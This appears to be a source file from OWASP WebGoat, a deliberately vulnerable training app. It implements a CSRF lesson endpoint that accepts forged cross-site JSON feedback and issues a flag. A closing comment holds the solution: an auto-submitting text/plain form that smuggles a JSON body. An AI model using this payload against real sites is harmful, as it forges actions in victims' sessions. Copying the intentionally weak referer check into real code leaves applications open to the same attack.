package org.owasp.webgoat.plugin;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AssignmentHints;
import org.owasp.webgoat.assignments.AssignmentPath;
import org.owasp.webgoat.assignments.AttackResult;
import org.owasp.webgoat.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.util.Map;
import java.util.UUID;

/**
 * @author nbaars
 * @since 11/17/17.
 */
@AssignmentPath("/csrf/feedback")
@AssignmentHints({"csrf-feedback-hint1", "csrf-feedback-hint2", "csrf-feedback-hint3"})
public class CSRFFeedback extends AssignmentEndpoint {

    @Autowired
    private UserSessionData userSessionData;
    @Autowired
    private ObjectMapper objectMapper;

    @PostMapping(value = "/message", produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(HttpServletRequest request, @RequestBody String feedback) {
        try {
            objectMapper.readValue(feedback.getBytes(), Map.class);
        } catch (IOException e) {
            return failed().feedback(ExceptionUtils.getStackTrace(e)).build();
        }
        boolean correctCSRF = requestContainsWebGoatCookie(request.getCookies()) && request.getContentType().equals(MediaType.TEXT_PLAIN_VALUE);
        correctCSRF &= hostOrRefererDifferentHost(request);
        if (correctCSRF) {
            String flag = UUID.randomUUID().toString();
            userSessionData.setValue("csrf-feedback", flag);
            return success().feedback("csrf-feedback-success").feedbackArgs(flag).build();
        }
        return failed().build();
    }

    @PostMapping(produces = "application/json")
    @ResponseBody
    public AttackResult flag(@RequestParam("confirmFlagVal") String flag) {
        if (flag.equals(userSessionData.getValue("csrf-feedback"))) {
            return trackProgress(success().build());
        } else {
            return trackProgress(failed().build());
        }
    }

    private boolean hostOrRefererDifferentHost(HttpServletRequest request) {
        String referer = request.getHeader("referer");
        String host = request.getHeader("host");
        if (referer != null) {
            return !referer.contains(host);
        } else {
            return true;
        }
    }

    private boolean requestContainsWebGoatCookie(Cookie[] cookies) {
        if (cookies != null) {
            for (Cookie c : cookies) {
                if (c.getName().equals("JSESSIONID")) {
                    return true;
                }
            }
        }
        return false;
    }

    /** Solution
     <form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST">
     <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>
     </form>
     <script>document.attack.submit();</script>
     */
}
